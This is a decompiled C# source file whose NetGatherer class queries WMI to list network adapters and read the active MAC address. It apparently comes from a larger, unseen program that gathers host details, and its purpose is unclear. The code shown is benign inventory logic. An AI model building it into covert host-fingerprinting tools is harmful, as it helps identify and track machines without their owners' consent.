using System;
using System.Collections.Generic;
using NoiseMe.Drags.App.Models.WMI.Objects;

namespace NoiseMe.Drags.App.Data.WMI
{
	// Token: 0x02000171 RID: 369
	public static class NetGatherer
	{
		// Token: 0x06000BE9 RID: 3049 RVA: 0x00023D80 File Offset: 0x00021F80
		public static ICollection<NetworkAdapter> GetNetworkAdapter()
		{
			List<NetworkAdapter> list = new List<NetworkAdapter>();
			string[] properties = new string[]
			{
				"Caption",
				"Description",
				"IPEnabled",
				"MacAddress"
			};
			WmiInstanceClassCollection wmiInstanceClassCollection = WmiInstance.Query("Win32_NetworkAdapterConfiguration", properties, null);
			if (wmiInstanceClassCollection == null)
			{
				return list;
			}
			foreach (WmiInstanceClass wmiInstanceClass in wmiInstanceClassCollection)
			{
				NetworkAdapter item = new NetworkAdapter((string)wmiInstanceClass["Caption"].Value, (string)wmiInstanceClass["Description"].Value, (bool?)wmiInstanceClass["IPEnabled"].Value, (string)wmiInstanceClass["MACAddress"].Value);
				list.Add(item);
			}
			return list;
		}

		// Token: 0x06000BEA RID: 3050 RVA: 0x00023E6C File Offset: 0x0002206C
		public static string GetActiveMacAddress()
		{
			string property = "MACAddress";
			string condition = "IPEnabled = TRUE";
			return WmiInstance.PropertyQuery<string>("Win32_NetworkAdapterConfiguration", property, condition, null);
		}
	}
}
